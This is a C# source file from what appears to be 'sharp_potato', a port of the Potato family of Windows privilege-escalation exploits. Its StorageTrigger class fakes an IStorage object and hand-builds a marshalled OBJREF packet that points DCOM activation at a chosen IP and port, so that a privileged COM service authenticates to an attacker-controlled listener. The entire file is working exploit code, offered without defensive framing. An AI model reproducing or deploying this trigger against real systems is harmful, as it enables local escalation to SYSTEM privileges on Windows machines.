using System.Net;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using Vanara.PInvoke;

namespace sharp_potato;

public class StorageTrigger : Ole32.IMarshal, Ole32.IStorage // , ICustomQueryInterface
{
    private Ole32.IStorage storage;
    private IPEndPoint serverEndPoint;

    public StorageTrigger(Ole32.IStorage storage, IPEndPoint serverEndPoint)
    {
        this.storage = storage;
        this.serverEndPoint = serverEndPoint;
    }

    public Guid GetUnmarshalClass(in Guid riid, object pv, Ole32.MSHCTX dwDestContext, IntPtr pvDestContext, Ole32.MSHLFLAGS mshlflags) =>
        Guid.Parse("00000306-0000-0000-c000-000000000046");

    public uint GetMarshalSizeMax(in Guid riid, object pv, Ole32.MSHCTX dwDestContext, IntPtr pvDestContext, Ole32.MSHLFLAGS mshlflags) => 1024;

    public unsafe void MarshalInterface(IStream pStm, in Guid riid, object pv, Ole32.MSHCTX dwDestContext, IntPtr pvDestContext, Ole32.MSHLFLAGS mshlflags)
    {
        var marshalBuffer = CompilePacket(serverEndPoint.Port.ToString(), serverEndPoint.Address.ToString());
        int written = 0;
        pStm.Write(marshalBuffer, marshalBuffer.Length, new IntPtr(&written));
    }

    public object UnmarshalInterface(IStream pStm, in Guid riid) => null;

    public void ReleaseMarshalData(IStream pStm)
    {
    }

    public void DisconnectObject(uint dwReserved = 0)
    {
    }

    public IStream CreateStream(string pwcsName, STGM grfMode, uint reserved1 = 0, uint reserved2 = 0) =>
        storage.CreateStream(pwcsName, grfMode, reserved1, reserved2);

    public IStream OpenStream(string pwcsName, IntPtr reserved1, STGM grfMode, uint reserved2 = 0) =>
        storage.OpenStream(pwcsName, reserved1, grfMode, reserved2);

    public Ole32.IStorage CreateStorage(string pwcsName, STGM grfMode, uint reserved1 = 0, uint reserved2 = 0) =>
        storage.CreateStorage(pwcsName, grfMode, reserved1, reserved2);

    public Ole32.IStorage OpenStorage(string pwcsName, Ole32.IStorage pstgPriority, STGM grfMode, Ole32.SNB snbExclude, uint reserved = 0) =>
        storage.OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved);

    public void CopyTo(uint ciidExclude, Guid[] rgiidExclude, Ole32.SNB snbExclude, Ole32.IStorage pstgDest) =>
        storage.CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest);

    public void MoveElementTo(string pwcsName, Ole32.IStorage pstgDest, string pwcsNewName, Ole32.STGMOVE grfFlags) =>
        storage.MoveElementTo(pwcsName, pstgDest, pwcsName, grfFlags);

    public void Commit(Ole32.STGC grfCommitFlags) => storage.Commit(grfCommitFlags);

    public void Revert()
    {
    }

    public Ole32.IEnumSTATSTG EnumElements(uint reserved1, IntPtr reserved2, uint reserved3 = 0) =>
        storage.EnumElements(reserved1, reserved2, reserved3);

    public void DestroyElement(string pwcsName) =>
        storage.DestroyElement(pwcsName);

    public void RenameElement(string pwcsOldName, string pwcsNewName) =>
        storage.RenameElement(pwcsOldName, pwcsNewName);

    public void SetElementTimes(string pwcsName, FILETIME[] pctime, FILETIME[] patime, FILETIME[] pmtime)
    {
    }

    public void SetClass(in Guid clsid)
    {
    }

    public void SetStateBits(uint grfStateBits, uint grfMask)
    {
    }

    public void Stat(out STATSTG pstatstg, Ole32.STATFLAG grfStatFlag)
    {
        storage.Stat(out pstatstg, grfStatFlag);

        pstatstg.pwcsName = "hello.stg";
    }

    public CustomQueryInterfaceResult GetInterface(ref Guid iid, out IntPtr ppv)
    {
        if (iid == Guid.Parse("0000000B-0000-0000-C000-000000000046"))
            ppv = (IntPtr) GCHandle.Alloc(this);
        if (iid == Guid.Parse("00000003-0000-0000-C000-000000000046"))
            ppv = (IntPtr) GCHandle.Alloc(this);
        else
        {
            ppv = IntPtr.Zero;
            return CustomQueryInterfaceResult.Failed;
        }

        return CustomQueryInterfaceResult.Handled;
    }

    private static byte[] EncodeString(string str) => Encoding.Unicode.GetBytes('\0' + str)[1..^1];

    private static byte[] CompilePacket(string port, string address)
    {
        var stream = new MemoryStream();
        var writer = new BinaryWriter(stream);

        var headerBytes = new byte[]
        {
            0x4d, 0x45, 0x4f, 0x57, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xcc, 0x96, 0xec, 0x06, 0x4a, 0xd8,
            0x03, 0x07, 0xac, 0x31, 0xce, 0x9c, 0x02, 0x9d, 0x53, 0x00, 0x9f, 0x93, 0x2c, 0x04, 0xcd, 0x54, 0xd4, 0xef, 0x4b,
            0xbd, 0x1c, 0x3b, 0xae, 0x97, 0x21, 0x45
        };

        var footerBytes = new byte[] {0x00, 0x5d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00};

        const short secLength = 8;
        int portLength = port.Length;
        int strPortLength = (address.Length + portLength + 2) * 2 + 6;
        int totalLength = (strPortLength + secLength) / 2;
        int secOffset = strPortLength / 2;
        portLength *= 2;

        writer.Write(headerBytes);
        writer.Write(new byte[] {(byte) totalLength, 0, (byte) secOffset, 0});
        writer.Write((byte) 0x07);
        writer.Write(EncodeString(address));
        writer.Write(new byte[] {0x00, 0x5B});
        writer.Write(EncodeString(port));
        writer.Write(footerBytes);

        return stream.ToArray();
    }
}